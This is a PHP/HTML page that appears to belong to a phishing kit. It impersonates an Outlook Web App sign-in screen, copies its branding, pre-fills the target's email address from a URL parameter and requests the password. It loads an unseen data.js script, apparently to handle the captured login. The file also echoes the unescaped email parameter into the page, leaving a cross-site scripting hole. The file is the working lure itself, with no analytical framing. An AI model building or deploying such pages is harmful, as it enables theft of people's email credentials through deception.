<?php
    if(isset($_GET['email'])){
        $email = $_GET['email'];
    }
?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta name="referrer" content="strict-origin" />
	<title>Login into your outlook webapp account</title>
	<link rel="icon" type="icon" href="logo.PNG">
	<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/all.css">
	<style type="text/css">
		body{
			background:#fff;
		}

		.hide{
			display: none;
		}

		.main{display: flex; justify-content: center; align-items: center;}
		.bg-main{background:#0473c5;}
		.vh-100{height: 100vh;}
		.btn-color{color: #0473c5;}
	</style>
</head>
<body>
	<div class="container-fluid p-0">
		<div class="col-xs-12 col-sm-12 col-md-4 float-left bg-main vh-100 main">
			<img src="logo.png" width="130">
		</div>
		<div class="col-xs-12 col-sm-12 col-md-8 float-right vh-100 bg-light main">
			<div class="col-sm-12 col-md-8 col-lg-6 col-xl-6 mx-auto">
				<img src="outlook.png" width="250">
				<form>
					<div class="form-group">
						<p class="m-0 p-0 mt-2 text-secondary font-weight-normal" id="domain"></p>
						<p class="m-0 p-0 mt-2 font-weight-normal alert2"></p>
					</div>
					<div class="form-group">
						<label for="email" class="m-0 p-0 text-secondary font-weight-normal">Email address:</label>
						<input type="email" class="form-control rounded-0" value="<?php echo $email; ?>" name="email" id="email" required="" readonly>
					</div>
					<div class="form-group">
						<label for="email" class="m-0 p-0 text-secondary font-weight-normal">Password:</label>
						<input type="password" class="form-control rounded-0" name="email" id="password" required="">
					</div>
					<div class="form-group">
						<button class="btn bg-light p-0 btn-color font-weight-bold py-2" id="next"><span class="fas fa-arrow-alt-circle-right btn-color fa-1x"></span><span class="ml-2">Sign in</span></button>
					</div>
				</form>
			</div>
		</div>
	</div>
	<script src="vendor/jquery/jquery-2.2.3.min.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
	<script src="font-awesome/js/all.js"></script>
	<script src="js/data.js"></script>
</body>
</html>